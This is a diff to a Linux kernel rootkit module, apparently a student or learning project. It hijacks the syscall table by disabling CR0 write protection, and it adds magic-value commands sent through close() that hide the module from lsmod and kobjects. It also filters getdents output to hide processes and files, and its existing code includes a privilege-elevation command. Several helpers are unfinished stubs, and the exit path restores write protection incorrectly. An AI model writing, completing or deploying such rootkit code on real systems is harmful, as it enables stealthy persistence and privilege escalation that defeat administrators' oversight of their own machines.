@@ -52,12 +52,18 @@ pid_t proc_open_pid;
 int proc_open_fd;
 
 
+u_int8_t module_hidden;
+u_int8_t hide_files_flag;
+
 /***************************************************************************/
 /* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
 #define ELEVATE_UID -23121990
 #define HIDE_PROCESS -19091992
+#define HIDE_MODULE -657623
+#define SHOW_MODULE -9032847
 #define SHOW_PROCESS -2051967
-
+#define HIDE_FILES -7111963
+#define SHOW_FILES -294365563
 
 /***************************************************************************/
 
@@ -67,6 +73,52 @@ unsigned long **syscall_table;
 asmlinkage int (*original_close)(int fd);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*original_open)(const char __user *pathname, int flags, int mode);
+
+int hide_files()
+{
+    int err = 0;
+    if (!hide_files_flag) {
+        hide_files_flag = 1;
+        err = 1;
+    }
+    return err;
+}
+int show_files()
+{
+    int err = 0;
+    if (hide_files_flag) {
+        hide_files_flag = 0;
+        err = 1;
+    }
+    return err;
+}
+
+int hide_module()
+{
+    int err = 0;
+    if (!module_hidden) {
+        module_hidden = 1;
+
+        // stop from showing on lsmod
+        list_del_init(&__this_module.list);
+
+        // stop showing in /proc/kallsyms
+        kobject_del(&THIS_MODULE->mkobj.kobj);
+        
+        err = 1;
+    }
+    return err;
+}
+
+int show_module()
+{
+    int err = 0;
+    if (module_hidden) {
+        // TODO
+        err = 1;
+    }
+    return err;
+}
 
 int elevate_current_privileges(void)
 {
@@ -144,7 +196,7 @@ out:
 
 char *get_str_in_kernelspace(const char __user *ustr, char *kstr, int max)
 {
-    size_t len = strnlen_user(ustr, max); // including null termiantor
+    size_t len = strnlen_user(ustr, max); // including null terminator
     if (len > max)
         return NULL;
     strncpy_from_user(kstr, ustr, len);
@@ -169,6 +221,27 @@ out:
     return ret;
 }
 
+/*
+ * Takes in a string (null-terminated) that represents a component of a pathname 
+ * tries to convert it into pid_t
+ * returns pid if possible
+ * -1 otherwise
+ */
+pid_t get_pid_from_str(const char *str)
+{
+    // TODO
+}
+
+/*
+ * Takes in a string (null-terminated) that represents a component of a pathname
+ * 1 if it matches a pattern that the rootkit wants to hide
+ * 0 otherwise
+ */
+int filename_matches_pattern(const char *filename)
+{
+    // TODO
+}
+
 asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
     mm_segment_t old_fs;
@@ -178,6 +251,11 @@ asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned 
     unsigned long kbuf_offset, ubuf_offset;
     kbuf_offset = ubuf_offset = 0;
     kbuf = buf_struct.buf;
+    pid_t pid;
+    void *ubuf = dirp;
+
+
+    spin_lock(&(buf_struct.lock));
 
     old_fs = get_fs();
     ret = original_getdents(fd, (struct linux_dirent *) kbuf, BUFSIZE);
@@ -186,20 +264,31 @@ asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned 
     if (ret < 0)
         goto out;
 
-    dir = (struct linux_dirent *) kbuf;
     for (kbuf_offset = 0; kbuf_offset < ret; kbuf_offset += dir->d_reclen) {
         dir = (struct linux_dirent *) (kbuf + kbuf_offset);
 
         if (proc_open_fd == fd && proc_open_pid == current->pid) {
-            /* this means we are calling getdents on "/proc/"
+            /* this means we are calling getdents on "/proc"
                we have to hide the pids in our list */
+            pid = get_pid_from_str(dir->name);
+            if (pid > 0 && is_in_hidden_pids(pid))
+                continue;
         }
-        else {
-            /* also check for special prefixes or suffixes
-               and hide those files as well  */
-        }
+        
+        /* also check for special prefixes or suffixes
+           and hide those files that match pattern  */ 
+        if (hide_files_flag && filename_matches_pattern(dir->name))
+                continue;
+
+        /* normal copy if nothing to hide */
+        copy_to_user(ubuf + ubuf_offset, kbuf + kbuf_offset, dir->d_reclen);
+        ubuf_offset += dir->d_reclen;
     }
+
+    ret = ubuf_offset;
+
 out:
+    spin_unlock(&(buf_struct.lock));
     return ret;
 }
 
@@ -235,6 +324,18 @@ asmlinkage int my_close(int fd)
         case SHOW_PROCESS:
             show_current_process();
             break;
+        case HIDE_FILES:
+            hide_files();
+            break;
+        case SHOW_FILES:
+            show_files();
+            break;
+        case HIDE_MODULE:
+            hide_module();
+            break;
+        case SHOW_MODULE:
+            show_module();
+            break;
         }
     }
     else {
@@ -263,8 +364,6 @@ pointer_size_t **find_syscall_table(void)
     return NULL;
 }
 
-
-
 void init_buf_struct(void)
 {
     spin_lock_init(&(buf_struct.lock)); 
@@ -280,21 +379,21 @@ int rootkit_init(void)
     printk("Rootkit loaded\n");
     proc_open_fd = -1;
     proc_open_pid = -1;
+    module_hidden = 0;
+    hide_files_flag = 0;
+    
     init_buf_struct();
     init_hidden_pids_list();
+
+    hide_files();
 
     /* Uncomment the following lines after completion of module 
      * Can't rmmod it if we have it uncommented during dev
      * That's just cumbersome during dev
-     */
-    
-    /*
-    // stop from showing on lsmod
-    list_del_init(&__this_module.list);
+     */    
+    //hide_module();
 
-    // stop showing in /proc/kallsyms
-    kobject_del(&THIS_MODULE->mkobj.kobj);
-    */
+
     
     syscall_table = find_syscall_table();
     if (!syscall_table) {
@@ -302,7 +401,6 @@ int rootkit_init(void)
     }
     
     printk("Syscall table at %p\n", syscall_table);
-
     
     // make writable by disabling write protect
     write_cr0(read_cr0() & (~0x10000));
@@ -316,7 +414,8 @@ int rootkit_init(void)
     syscall_table[__NR_open] = (void *) my_open;
 
     // hijack getdents system call
-    original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int)) syscall_table[__NR_getdents];
+    original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
+                        syscall_table[__NR_getdents];
     syscall_table[__NR_getdents] = (void *) my_getdents;
 
     // enable write protected
@@ -332,8 +431,6 @@ void rootkit_exit(void)
 {
     deinit_buf_struct();
 
-
-
     write_cr0(read_cr0() & (~0x10000));
 
     syscall_table[__NR_close] = (void *) original_close;
@@ -342,8 +439,7 @@ void rootkit_exit(void)
 
     write_cr0(read_cr0() & 0x10000);
 
-
-
+    show_module();
     printk("Rootkit unloaded\n");
 }
 
